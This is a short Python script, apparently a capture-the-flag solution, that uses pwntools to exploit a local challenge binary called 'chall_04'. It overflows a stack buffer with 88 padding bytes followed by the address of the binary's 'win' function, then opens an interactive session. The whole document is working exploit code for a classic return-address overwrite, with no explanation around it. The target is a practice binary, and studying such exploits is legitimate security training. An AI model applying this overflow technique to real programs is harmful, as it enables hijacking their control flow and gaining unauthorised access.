from pwn import *
elf = ELF("./chall_04")
payload = b's'*88+p64(elf.sym.win)
p=process("./chall_04")
p.sendline(payload)
p.interactive()
